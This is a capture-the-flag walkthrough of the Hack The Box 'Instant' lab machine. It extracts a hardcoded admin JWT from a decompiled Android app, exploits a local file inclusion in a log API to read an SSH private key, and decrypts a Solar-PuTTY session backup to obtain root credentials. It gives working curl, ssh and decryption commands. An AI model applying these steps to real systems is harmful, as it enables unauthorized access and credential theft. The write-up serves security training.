Start as always enumerating ports on the machine:

```
  nmap -A 10.10.11.37
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 18:40 CET
  Nmap scan report for 10.10.11.37 (10.10.11.37)
  Host is up (0.034s latency).
  Not shown: 998 closed tcp ports (conn-refused)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
  |_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
  80/tcp open  http    Apache httpd 2.4.58
  |_http-title: Did not follow redirect to http://instant.htb/
  |_http-server-header: Apache/2.4.58 (Ubuntu)
  Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
A website with hostname instant.htb is hosted on port 80.
Add the host in /etc/host and let's see the website's content.

Once on the website, we find a download link for the app Instant (an app for money transfers as we can see).

It's not strictly necessary, but i tried also the app using Genymotion.
However, is enough to decompile it and read the classes.

I used jadx tool to read the apk content:

![image](https://github.com/user-attachments/assets/f92f7076-ba1b-42ab-b3af-8a599d0de518)

Essentially, the app has these functionality (highlighted in the image above):
```
- Register
- Login
- Transaction
- Admin
```

All the others classes has no real interaction.

As highlighted in the image above, all these functionalities are using an API endpoint:
```
http://mywalletv1.instant.htb/api/v1/
```

In each class is defined what is the endpoint and the content it expects.
I used this info to try all these functionalities but there's really nothing more you can do.

Analyzing the "AdminActivieties" class, i found a function that checks if you have admin authorization:


![image](https://github.com/user-attachments/assets/ed3dbe70-cc5b-4203-a465-7392db5f0d2a)

This function, as you can see, exposed a JWT Session Token of the Admin user. Awesome! For us :D

I tried to make a view/profile API call to see if the JWT Token works and that's the result (note to add the hostname in the /etc/hosts file):

```
curl  -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" http://mywalletv1.instant.htb:80/api/v1/view/profile
{"Profile":
  {
    "account_status":"active",
    "email":"admin@instant.htb",
    "invite_token":"instant_admin_inv",
    "role":"Admin",
    "username":"instantAdmin",
    "wallet_balance":"10000000",
    "wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"
  },
"Status":200
}
```
I tried to play around with this token to see if i could break something or escalate with my base user, but with no results.

Then, in the decompiled files, i found a config file with a reference to another subdomain:

![image](https://github.com/user-attachments/assets/c253892e-3545-4f1d-8374-ab7f808a8099)

I Added this subdomain to the /etc/hosts file and i searched it on the browser.
Here i found the Swagger UI for API docs that lists all the api we can use and try directly from the UI.

The one that seems more interesting is the '/api/v1/admin/read/log' that reads log file in the filesystem.
(I had to use the JWT Token of the Admin user to authenticate).

Infact, after some tries, i found an LFI:

![image](https://github.com/user-attachments/assets/39398785-b528-4130-9b63-333f7f7f0e6f)

And here starts a little of guessing and trying to exfiltrate as much info as possibile.
In these cases, i suggest to check /proc/self/ files.

It took me a while, but after been stuck on searching swagger ui files that could lead to password, i had a different idea.
I check the .ssh folder in the home of user "shirohige" and i found a private key.

I wrote it in a file and formatted correctly, then I given the write permission to the key:

```
chmod 600 shirohige_key
```

Then i tried to login with ssh, using this ssh private key:

```
ssh shirohige@instant.htb -i shirohige_key
```

And boom! We are in!


Let's find a way to priv esc. I used linpeas and i found 2 potential things to explore:

1) A PBKDF2-SHA256 salted hash of the Admin password:
```
1, instantAdmin, admin@instant.htb, f0eca6e5-783a-471d-9d8f-0162cbc900db, pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978, 2024-07-23 00:20:52.529887, 87348, Admin, active
```

2) A SolarPutty Session data file:

```
shirohige@instant:/opt/backups/Solar-PuTTY# cat sessions-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

Let's analyze them. 

1) There are several tools to crack PBKDF2-SHA256, like Hashcat or specific tool for PBKDF2 hash.
The problem with that is that it uses 600000 iterations. This means that for each password candidate, hashcat will add the salt and iterate 600000 times resulting in a reeeally slow and painful cracking process.


2) The SolarPutty session data typically contains info on a session opened before, this could contain credentials (maybe cyphered by Putty).
I found a python tool to recover info from the session data, https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5, that essentially decode from base64 the input session data, breaks the array into salt, initial vector and encrypted data, then it derives the decrypt key using PBKDF2. With all this info, it decrypts encrypted data using 3DES.

```
python3 solarputtydecrypt.py sessions-backup.dat /home/francesco/Downloads/rockyou.txt 
```

Giving the above params, i got the recovered session info in plaintext and it contains root:password creds. Awesome!!

I tried to log in with the creds we found and we are root :D






